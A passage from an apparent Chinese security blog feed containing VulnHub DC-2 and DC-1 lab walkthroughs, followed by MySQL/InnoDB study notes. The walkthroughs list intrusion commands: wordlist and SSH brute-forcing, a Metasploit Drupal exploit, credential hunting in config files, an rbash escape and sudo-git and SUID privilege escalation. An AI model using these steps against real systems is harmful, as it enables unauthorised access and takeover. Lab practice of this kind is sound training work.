]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub-DC-2靶场练习</title>
    <url>/posts/ce8eed56/</url>
    <content><![CDATA[<p>靶机地址：192.168.99.150（DC-2）<a href="https://www.vulnhub.com/entry/dc-2,311/">链接</a></p>
<p>渗透机：192.168.99.188（Kali）</p>
<p>物理主机：192.168.99.107（Windows10）</p>
<p>目标：尽可能拿到更多的flag，有5个</p>
<p>nmap主机发现：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502172127928.png" alt loading="lazy"></p>
<p>访问80端口，发现是一个WordPress站点，首页有flag1，如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502172310497.png" alt loading="lazy"></p>
<p>似乎是让我们对用户进行爆破，但常规的密码字典里可能没有我们所需要的密码，于是采用<code>Cewl</code>进行密码信息搜集</p>
<pre class="language-none"><code class="language-none">cewl http:&#x2F;&#x2F;dc-2&#x2F; -m 3 -d 3 -e -v -w wppass.txt
-m 最小单词长度
-d：爬网深度
-e：收集包含email地址信息
-v：Verbose模式，该模式下，Cewl会导出目标网站的详细数据
-w：保存字典文件</code></pre>

<p>得到字典后使用wpscan对网站后台进行扫描测试</p>
<pre class="language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u -P &#x2F;home&#x2F;kali&#x2F;msf_exp&#x2F;wppass.txt
-e: 枚举 u表示枚举用户
-P: 爆破密码字典路径</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502173058881.png" alt loading="lazy"></p>
<p>拿到两个用户的用户名和密码</p>
<pre class="language-none"><code class="language-none">Username: jerry, Password: adipiscing
Username: tom, Password: parturient</code></pre>

<p>登录后台，在page里拿到flag2</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502173751322.png" alt loading="lazy"></p>
<p>找其它的切入点，前面nmap在0-1000的端口中只扫到了一个80端口，加大力度，改成0-10000</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502174409458.png" alt loading="lazy"></p>
<p>扫到一个7744的ssh端口，tom用户连上使用wp的后台密码即可登录，jerry不行，可能不是这个密码，也可能jerry不允许ssh登录</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502174816845.png" alt loading="lazy"></p>
<p>登录目录下找到flag3，less查看</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502174852430.png" alt loading="lazy"></p>
<p>随后尝试很多命令用不了，当前目录下的usr目录也进不去，查看当前目录下所有文件，查看<code>.bash_history</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502175516495.png" alt loading="lazy"></p>
<p><code>ls -al usr/bin</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502175312778.png" alt loading="lazy"></p>
<p>有四个命令可以用，并且使用的是rbash，一个功能受限的bash，限制性可能会有如下</p>
<ul>
<li>使用命令cd更改目录</li>
<li>设置或者取消环境变量的设置（SHELL, PATH, ENV, or BASH_ENV）</li>
<li>指定包含参数<code>&#39;/&#39;</code>的文件名</li>
<li>指定包含参数<code>&#39; - &#39;</code>的文件名</li>
<li>使用重定向输出<code>&#39;&gt;&#39;, &#39;&gt;&gt;&#39;, &#39;&gt; |&#39;, &#39;&lt;&gt;&#39; &#39;&gt;&amp;&#39;,&#39;&amp;&gt;&#39;</code></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502193832294.png" alt loading="lazy"></p>
<p>使用scp绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502193742568.png" alt loading="lazy"></p>
<p>还可以这样</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502200235932.png" alt loading="lazy"></p>
<p>也可以用vi，方法不唯一，搬张图，可参考文末的链接</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502200311594.png" alt loading="lazy"></p>
<p>在jerry的用户目录下找到<code>flag4.txt</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502200512732.png" alt loading="lazy"></p>
<p><code>you&#39;re on your own now.  :-)</code>，线索<code>git</code></p>
<p>配置当前shell环境变量</p>
<pre class="language-none"><code class="language-none">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;
export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502211021164.png" alt loading="lazy"></p>
<p>大部分命令可用了</p>
<p>根据flag3的提示，su切换到jerry，密码就是上面的密码，<code>sudo -l</code>看看用户可以用sudo运行一些命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502213404125.png" alt loading="lazy"></p>
<p>git可用，git提权</p>
<pre class="language-none"><code class="language-none">sudo git help config  
在末行命令模式输入 !&#x2F;bin&#x2F;bash 或 !&#39;sh&#39;</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-2/image-20210502213732806.png" alt loading="lazy"></p>
<p>成功拿到最后的flag    </p>
<p><strong>参考：</strong></p>
<ul>
<li><a href="https://cloud.tencent.com/developer/article/1680551">RBash - 受限的Bash绕过</a></li>
<li><a href="https://www.const27.com/2021/03/12/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">Linux 提权总结</a></li>
<li><a href="https://www.secpulse.com/archives/72965.html">利用通配符实现Linux本地提权</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub-DC-1靶场练习</title>
    <url>/posts/5787bcec/</url>
    <content><![CDATA[<p>靶机使用VMware搭建，网络为桥接模式，也可使用NAT模式</p>
<p>操作不难，主要学思路和方法，老是看别人渗透操作感觉我上我也行，但实际上自己真正的来操作了就知道了，越到后面就越不知道从何入手。。。</p>
<p>靶机：192.168.99.170（DC-1），<a href="https://www.vulnhub.com/entry/dc-1,292/">vulnhub地址</a></p>
<p>渗透机：192.168.99.188（Kali）</p>
<p>物理主机：192.168.99.107（Windows10）</p>
<p>目标：尽可能拿到更多的flag</p>
<p>nmap主机发现：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">nmap -sP -PR <span class="token number">192.168</span>.99.1/24
-sP: Ping Scan - go no further than determining <span class="token keyword">if</span> <span class="token function">host</span> is online
-PR: ARP Ping</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501114628048.png" alt loading="lazy"></p>
<p>找到靶机地址，对靶机端口进行扫描：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -T4 -A -sN <span class="token number">192.168</span>.99.170
-sN: TCP Null, FIN, and Xmas scans
-A: Enables OS detection and Version detection</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501115129119.png" alt loading="lazy"></p>
<p>查看80端口有http服务开放，打开发现是一个Drupal站点，版本为Drupal 7，网上搜有18年的代码执行漏洞（CVE-2018-7600）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501155026635.png" alt loading="lazy"></p>
<p>上msf，<code>search drupal</code>，用18年的</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501155618792.png" alt loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">use exploit/unix/webapp/drupal_drupalgeddon2
<span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.169</span>.99.170
exploit</code></pre>

<p>成功弹回一个shell</p>
<p>查看系统信息<code>sysinfo</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501164905497.png" alt loading="lazy"></p>
<p>进入系统shell，查看当前用户为www-data</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501165519887.png" alt loading="lazy"></p>
<p>搜集信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501161345481.png" alt loading="lazy"></p>
<p>拿到flag1，<code>Every good CMS needs a config file - and so do you.</code>，根据提示找配置文件</p>
<p><code>search -f setting*</code> 或<code>find . -type f | xargs grep &quot;password&quot;</code>找setting开头的文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501163530112.png" alt loading="lazy"></p>
<p><code>download ./sites/default/settings.php /home/kali/</code>下载下来看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501163755265.png" alt loading="lazy"></p>
<p>拿到flag2，数据库用户账号密码</p>
<pre class="language-none"><code class="language-none">dictionary attacks aren&#39;t the
only ways to gain access (and you WILL need access).
What can you do with these credentials?

&#39;username&#39; &#x3D;&gt; &#39;dbuser&#39;,
&#39;password&#39; &#x3D;&gt; &#39;R0ck3t&#39;,</code></pre>

<p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>进入一个交互式的shell，为什么要用交互式shell，因为非交互shell无回显，<a href="https://blog.csdn.net/gui951753/article/details/79154496">详见</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501165847912.png" alt loading="lazy"></p>
<p><code>mysql -udbuser -pR0ck3t</code>登录<code>mysql</code>命令行</p>
<p><code>select * from users \G;</code> </p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501202239805.png" alt loading="lazy"></p>
<p>admin密码加密的，这里有两个方法可以拿到后台管理员的账号</p>
<p>一个是把数据库中admin的密码给改成我们想要的密码，前提是要经过<code>Drupal</code>后端加密的才行</p>
<p>在网站根目录<code>scripts</code>找到加密脚本，<a href="http://drupalchina.cn/node/2128">参考</a></p>
<p>执行加密脚本<code>php scripts/password-hash.sh 123456</code>，得到<code>123456</code>加密后的密码<code>$S$DO3Rg8SH1xaO3lXuF8sKc8905t0xwoMMO80Ikju//Ia1JwdtrWz5</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501202852481.png" alt loading="lazy"></p>
<p>在数据库中<code>update</code>管理员的密码，即可用更改后的密码登录</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501203540144.png" alt loading="lazy"></p>
<p>还有一种方法，<code>searchsploit drupal</code>发现<code>Drupal 7.0 &lt; 7.31</code>版本存在SQL注入，可以直接添加管理员账号，<a href="https://www.exploit-db.com/exploits/34992">详见</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501204048208.png" alt loading="lazy"></p>
<p><code>python 34992.py -t http://192.168.99.170 -u extrader -p 123456</code> 即可添加管理员用户</p>
<p>登录后台</p>
<p>content里找到flag3</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501204137968.png" alt loading="lazy"></p>
<p>暗示<code>shadow</code>，<code>cat /etc/passwd</code>，发现flag4用户</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501204348304.png" alt loading="lazy"></p>
<p>在<code>/home/flag4</code>目录下找到<code>flag4.txt</code>文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501162541392.png" alt loading="lazy"></p>
<p>这里还可以用<code>hydra</code>爆破flag4的密码，虽然没啥用，学操作就够了</p>
<pre class="language-none"><code class="language-none">-l 指定用户名
-P 加载密码字典（自定义)
ssh:&#x2F;&#x2F;ip 指定使用协议和ip地址</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501210421392.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501210913760.png" alt loading="lazy"></p>
<pre class="language-none"><code class="language-none">Can you use this same method to find or access the flag in root?
Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code></pre>

<p>意思要我们提权</p>
<p>suid提权</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>找到一个属于root的有s权限的文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501205439109.png" alt loading="lazy"></p>
<p>提权，在<code>/root</code>目录下拿到最终的flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnHub-DC-1/image-20210501205503876.png" alt loading="lazy"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL学习笔记</title>
    <url>/posts/f12cbde5/</url>
    <content><![CDATA[<h3 id="MySQL存储引擎"><a href="#MySQL存储引擎" class="headerlink" title="MySQL存储引擎"></a>MySQL存储引擎</h3><p>存储引擎是MySQL组件，用于处理不同类型的SQL操作。</p>
<p>使用 <a href="https://dev.mysql.com/doc/refman/5.7/en/show-engines.html"><code>SHOW ENGINES</code></a> 语句查看服务器支持哪些存储引擎，Support列中表示是否可以使用，DEFAULT表示默认值。（下图版本为MySQL 5.7.26，Windows 10）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409135417092.png" alt loading="lazy"></p>
<p><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html"><code>InnoDB</code></a> 是默认的且用途最广的存储引擎，Oracle官方建议将其用于表（特殊用例除外）。（默认情况下 ，MySQL 5.7 or MySQL 8.0 中使用  <a href="https://dev.mysql.com/doc/refman/5.7/en/create-table.html"><code>CREATE TABLE</code></a> 语句创建<code>InnoDB</code>表。）</p>
<h4 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h4><p>事务型数据库的首选引擎，支持事务安全（ACID），具有提交（COMMIT），回滚（ROLLBACK）和奔溃恢复（crash-recovery）功能 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-acid.html">InnoDB and the ACID Model</a></p>
<p>行级锁定和Oracle风格的一致读取可提高多用户的并发性和性能 <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-locking-transaction-model.html">InnoDB Locking and Transaction Model</a></p>
<p>InnoDB将数据存放在磁盘上，以基于主键优化查询，每个InnoDB表都有一个称为聚集索引（The Clustered Index）的主键索引，该索引组织数据以最小化主键查找<code>I/O</code> <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-index-types.html">Clustered and Secondary Indexes</a></p>
<p>为了保持数据的完整性，InnoDB支持 <code>FOREIGN KEY</code> 约束，使用外键检查插入，更新和删除，以确保它们不会导致相关表之间的不一致。 <a href="https://dev.mysql.com/doc/refman/5.7/en/create-table-foreign-keys.html">FOREIGN KEY Constraints</a></p>
<p><strong>ACID</strong></p>
<ul>
<li><p>原子性（Atomicity）</p>
<p>一个事务要么全部提交成功，要么全部回滚失败，不能只执行其中的一部分操作</p>
</li>
<li><p>一致性（Consistency）</p>
<p>事务的执行不能破坏数据库的完整性和一致性，在一个事务在执行前后，数据库都必须处于一致性状态，以防止数据崩溃</p>
</li>
<li><p>隔离性（Isolation）</p>
<p>在并发的环境中，并发事务是相互隔离的，并发执行的事务直接不能互相干扰</p>
</li>
<li><p>持久性（Durability）</p>
<p>一旦事务提交，则对应数据库中的数据状态的变更就会永久的保存到数据库中</p>
</li>
</ul>
<p>一般来说，如果需要事务支持，并且有较高的并发读取频率，InnoDB首选</p>
<h4 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h4><p>所有数据值首先存储在低字节中（The Low Byte First），这使得MyISAM独立于操作系统，可以轻松地将其从Windows服务器移植到Linux服务器</p>
<p>每个<code>MyISAM</code>表都以三个文件存储在磁盘上。这些文件具有以表名开头的名称，并具有用于指示文件类型的扩展名，<code>.frm</code> 文件存储表格式，<code>.MYD</code>（MYData）文件存储数据，<code>.MYI</code>（MYIndex）存储索引</p>
<p>支持并发插入，即适合在插入密集型表中使用，例如管理邮件或Web服务器日志数据</p>
<p>MyISAM存储引擎在筛选大量数据时非常迅速，适合插入密集型表</p>
<h4 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h4><p>将所有数据存储在RAM中，以便在需要快速查找非关键数据的环境中进行快速访问，当mysqld守护进程崩溃时，所有的Memory数据都会丢失。</p>
<p>要求存储在Memory数据表里的数据使用的是长度不变的格式，不支持可变长度数据类型（包括BLOB和TEXT），VARCHAR是一种长度可变的类型，但因为它在MySQL内部当做长度固定不变的CHAR类型，所以可以使用。</p>
<p>一般在目标数据较小，而且访问非常频繁适合使用，造成内存的使用可以通过参数<code>max_help_table_size</code>控制<code>Memory</code>表的大小，如果数据是临时的，而且要求必须被立即使用，就可以存放在内存表之中，若数据丢失，不会对应用服务产生实质的负面影响，Memory同时支持散列索引和B数索引。</p>
<h4 id="CSV"><a href="#CSV" class="headerlink" title="CSV"></a>CSV</h4><p>实际上是带有逗号分隔符的文本文件，CVS表允许以CSV格式导入或转储数据，以便与读取和写入相同格式的脚本和应用程序交换数据。</p>
<p>CSV 存储引擎因为自身文件格式的原因，所有列必须强制指定 NOT NULL 。</p>
<p>CSV 存储引擎也会包含一个存储表结构的 .frm 文件，还会创建一个 .csv 存储数据的文件，还会创建一个同名的元信息文件，该文件的扩展名为 .CSM ，用来保存表的状态及表中保存的数据量。每个数据行占用一个文本行。</p>
<h4 id="ARCHIVE"><a href="#ARCHIVE" class="headerlink" title="ARCHIVE"></a>ARCHIVE</h4><p>归档，仅支持最基本的插入和查询两种功能，MySQL 5.5以后的版本中开始支持索引，Archive拥有很好的压缩机制，它使用zlib压缩库，在记录被请求时会实时压缩，所以它经常被用来当做仓库使用。</p>
<h4 id="BLACKHOLE"><a href="#BLACKHOLE" class="headerlink" title="BLACKHOLE"></a>BLACKHOLE</h4><p>黑洞存储引擎，所有插入的数据并不会保存，BLACKHOLE 引擎表永远保持为空，写入的任何数据都会消失。</p>
<h3 id="InnoDB底层原理"><a href="#InnoDB底层原理" class="headerlink" title="InnoDB底层原理"></a>InnoDB底层原理</h3><p>架构图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409171932233.png" alt loading="lazy"></p>
<h4 id="Buffer-Pool"><a href="#Buffer-Pool" class="headerlink" title="Buffer Pool"></a>Buffer Pool</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-buffer-pool.html">缓冲池</a></p>
<p>InnoDB为了做数据的持久化，会将数据存储到磁盘上。但是面对大量的请求时，CPU的处理速度和磁盘的IO速度之间差距太大，为了提高整体的效率， InnoDB引入了<strong>缓冲池</strong>。</p>
<p>缓冲池是内存中的一个区域，在InnoDB访问表和索引数据的时候会在其中进行高速缓存，缓冲池允许直接从内存访问经常使用的数据，从而加快了处理速度。在专用服务器上，通常将多达80％的物理内存分配给缓冲池。</p>
<p>为了提高大容量读取操作的效率，缓冲池被划分为多个页面，这些页面可以潜在地容纳多行，为了提高缓存管理的效率，使用最近最少使用（LRU）算法的变体，将很少使用的数据从缓存中老化掉。</p>
<p>如何利用缓冲池将经常访问的数据保留在内存中是MySQL调优的重要方面。</p>
<h4 id="Buffer-Pool-LRU-Algorithm"><a href="#Buffer-Pool-LRU-Algorithm" class="headerlink" title="Buffer Pool LRU Algorithm"></a>Buffer Pool LRU Algorithm</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-buffer-pool.html">缓冲池LRU算法</a></p>
<p>缓冲池使用LRU算法的变体作为列表进行管理。当需要空间以将新页面添加到缓冲池时，将驱逐最近使用最少的页面，并将新页面添加到列表的中间。此中点插入策略将列表视为两个子列表：</p>
<ul>
<li><p>最前面是最近访问过的新页面（“年轻”） 的子列表</p>
</li>
<li><p>在末尾，是最近访问过的旧页面的子列表</p>
</li>
</ul>
<p>官方结构图如下：</p>
<p><img src="https://dev.mysql.com/doc/refman/8.0/en/images/innodb-buffer-pool-list.png" alt loading="lazy"></p>
<ul>
<li>3/8的缓存池专用于旧的子列表</li>
<li>列表中点是新子列表的尾部与旧子列表的头部相交的界面</li>
<li>当InnoDB将页面读入缓冲池时，首先插入中点</li>
<li>访问旧子列表中的页面会使得其变为”年轻“，然后移至新子列表的开头</li>
<li>随着数据库的运行，通过移至列表的末尾，缓冲池中未访问的页面将“老化”，新的和旧的子列表中的页面都会随着其他页面的更新而老化，随着在中点插入页面，旧子列表中的页面也会老化。最终，未使用的页面到达旧子列表的尾部并被逐出。</li>
</ul>
<h4 id="Change-Buffer"><a href="#Change-Buffer" class="headerlink" title="Change Buffer"></a>Change Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-change-buffer.html">插入缓冲</a></p>
<p>插入缓冲针对的操作是更新或者插入，我们考虑最坏的情况，那就是需要更新的数据都不在缓冲池中。那么此时等数据达到某个阈值（例如50条）才批量的写入磁盘</p>
<p><img src="https://dev.mysql.com/doc/refman/8.0/en/images/innodb-change-buffer.png" alt loading="lazy"></p>
<p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_change_buffering"><code>innodb_change_buffering</code></a> 变量控制<code>InnoDB</code> 执行更改缓冲的程度，默认值为all。</p>
<ul>
<li><p><strong><code>all</code></strong></p>
<p>默认值：缓冲区插入，删除标记操作和清除。</p>
</li>
<li><p><strong><code>none</code></strong></p>
<p>不要缓冲任何操作。</p>
</li>
<li><p><strong><code>inserts</code></strong></p>
<p>缓冲区插入操作。</p>
</li>
<li><p><strong><code>deletes</code></strong></p>
<p>缓冲区删除标记操作。</p>
</li>
<li><p><strong><code>changes</code></strong></p>
<p>缓冲插入和删除标记操作。</p>
</li>
<li><p><strong><code>purges</code></strong></p>
<p>缓冲在后台发生的物理删除操作。</p>
</li>
</ul>
<p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_change_buffer_max_size"><code>innodb_change_buffer_max_size</code></a> 变量允许将更改缓冲区的最大大小配置为缓冲池总大小的百分比。默认情况下， <code>innodb_change_buffer_max_size</code>设置为25。最大设置为50。</p>
<h4 id="Log-Buffer"><a href="#Log-Buffer" class="headerlink" title="Log Buffer"></a>Log Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-redo-log-buffer.html">日志缓冲</a></p>
<p>日志缓冲区是存储区域，用于保存要写入磁盘上的日志文件的数据。日志缓冲区大小由<a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_log_buffer_size"><code>innodb_log_buffer_size</code></a>变量定义 。默认大小为16MB。日志缓冲区的内容会定期刷新到磁盘。较大的日志缓冲区使大型事务可以运行，而无需在事务提交之前将重做日志数据写入磁盘。因此，如果有更新，插入或删除许多行的事务，则增加日志缓冲区的大小可以节省磁盘I/O。</p>
<h4 id="Adaptive-Hash-Index"><a href="#Adaptive-Hash-Index" class="headerlink" title="Adaptive Hash Index"></a>Adaptive Hash Index</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-adaptive-hash.html">自适应哈希索引</a></p>
<p>自适应索引就跟JVM在运行过程中，会动态的把某些热点代码编译成Machine Code一样，InnoDB会监控对所有索引的查询，对热点访问的页建立哈希索引，以此来提升访问速度。</p>
<h4 id="Doublewrite-Buffer"><a href="#Doublewrite-Buffer" class="headerlink" title="Doublewrite Buffer"></a>Doublewrite Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-doublewrite-buffer.html">双写缓冲区</a></p>
<p><strong>插入缓冲</strong>提高了MySQL的性能，而<strong>两次写</strong>则在此基础上提高了数据的可靠性。当数据还在缓冲池中的时候，当机器宕机了，发生了<strong>写失效</strong>，有Redo Log来进行恢复。但是如果是在从缓冲池中将数据刷回磁盘的时候宕机了呢？</p>
<p>这种情况叫做部分写失效，此时重做日志就无法解决问题。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409163524052.png" alt loading="lazy"></p>
<p>在刷脏页时，并不是直接刷入磁盘，而是copy到内存中的Doublewrite Buffer中，然后再拷贝至磁盘共享表空间（你可以就理解为磁盘）中，每次写入1M，等copy完成后，再将Doublewrite Buffer中的页写入磁盘文件。</p>
<p>有了两次写机制，即使在刷脏页时宕机了，在实例恢复的时候也可以从共享表空间中找到Doublewrite Buffer的页副本，直接将其覆盖原来的数据页即可。</p>
<p>尽管数据被写入两次，但双写缓冲区不需要两倍的I / O开销或两倍的I / O操作。只需一次<code>fsync()</code>调用操作系统即可将数据按较大的顺序块写入doublewrite缓冲区（除非 <code>innodb_flush_method</code>设置为 <code>O_DIRECT_NO_FSYNC</code>）。</p>
<p>在MySQL 8.0.20之前，doublewrite缓冲区存储区位于<code>InnoDB</code>系统表空间中。从MySQL 8.0.20开始，doublewrite缓冲区存储区位于doublewrite文件中。</p>
<h4 id="Redo-Log"><a href="#Redo-Log" class="headerlink" title="Redo Log"></a>Redo Log</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-redo-log.html">重做日志</a></p>
<p>用于记录事务操作的变化，且记录的是修改之后的值。</p>
<p>不管事务是否提交都会记录下来。例如在更新数据时，会先将更新的记录写到Redo Log中，再更新缓存中页中的数据。然后按照设置的更新策略，将内存中的数据刷回磁盘。</p>
<h4 id="Undo-Log"><a href="#Undo-Log" class="headerlink" title="Undo Log"></a>Undo Log</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-undo-logs.html">撤消日志</a></p>
<p>记录事务开始之前的一个版本，可用于事务失败之后发生的回滚。</p>
<h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>MySQL索引的建立对于MySQL的高效运行是很重要的，索引可以大大提高MySQL的检索速度。</p>
<p>拿汉语字典的目录页（索引）打比方，我们可以按拼音、笔画、偏旁部首等排序的目录（索引）快速查找到需要的字。</p>
<p>创建索引时，你需要确保该索引是应用在 SQL 查询语句的条件(一般作为 WHERE 子句的条件)。</p>
<p>实际上，索引也是一张表，该表保存了主键与索引字段，并指向实体表的记录。</p>
<p>过多的使用索引将会造成滥用。因此索引也会有它的缺点：虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。建立索引会占用磁盘空间的索引文件。</p>
<p>索引分为：</p>
<ol>
<li><p>主键索引</p>
<p>primary key() 要求关键字不能重复，也不能为null,同时增加主键约束</p>
<p>主键索引定义时，不能命名</p>
</li>
<li><p>唯一索引</p>
<p>unique index() 要求关键字不能重复，同时增加唯一约束</p>
</li>
<li><p>普通索引</p>
<p>index() 对关键字没有要求</p>
</li>
<li><p>全文索引</p>
<p>fulltext key() 关键字的来源不是所有字段的数据，而是字段中提取的特别关键字</p>
</li>
</ol>
<p>先了解一下索引的数据结构 B-Tree（MySQL主要使用 B-tree 平衡树）</p>
<h4 id="B树"><a href="#B树" class="headerlink" title="B树"></a>B树</h4><p>B树也称B-树,它是一颗多路平衡查找树。大致结构如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410153354423.png" alt loading="lazy"></p>
<p>B树的阶为节点的最多的子节点数</p>
<p>B数的搜索方式从根节点开始，对节点内的关键字（有序）序列进行二分查找，如果命中则结束，否则进入查询关键字所属范围的儿子节点，叶子节点和非叶子节点都存放数据，搜索有可能在非叶子节点结束。</p>
<h4 id="B-树"><a href="#B-树" class="headerlink" title="B+树"></a>B+树</h4><p>B+ 树是 B 树的变体，也是一种多路搜索树。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410154531450.png" alt loading="lazy"></p>
<p>B+树只有到达叶子节点才命中，即所有关键字都出现在叶子节点链表中</p>
<ul>
<li>数据只能在叶子节点，也叫 <strong>稠密索引</strong>，且链表中的关键字（数据）恰好是有序的。</li>
</ul>
